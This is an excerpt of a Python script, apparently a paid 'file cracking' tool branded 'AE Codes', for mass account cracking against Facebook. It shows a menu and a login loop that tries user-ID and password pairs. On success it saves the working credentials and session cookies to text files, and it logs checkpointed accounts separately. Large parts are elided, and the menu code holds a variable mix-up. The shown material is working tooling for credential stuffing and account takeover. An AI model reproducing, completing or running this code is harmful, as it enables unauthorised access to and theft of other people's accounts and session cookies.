...
[AE] The Original Codes are Written by AE Codes
---------------------------------------------------
 ╰◈▪➣ Github    : https://github.com/EesAli
 ╰◈▪➣ Facebook  : 033[92;1m
 ╰◈▪➣ Author    : ArslEes
 ╰◈▪➣ Version   : AE [1.0]
 ╰◈▪➣   \033[1;96mEesAli and Arslan Bhai Bhai\033[1;97m
---------------------------------------------------''')
	p(logo)
...
class Main:
	...
	def menu(self):
		logo()
		p(' [•] This Script is Paid  ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join AE Codes Facebook Group ")
		p(' [3] Join AE Codes Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://No Group/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/EgALbCWnk3t0vJUNiO0YUO')
		else:
			p(' [•] Wrong Select ')
			sp(1)
			self.menu()
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AE-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AE_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AE_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[AE-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/AE_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
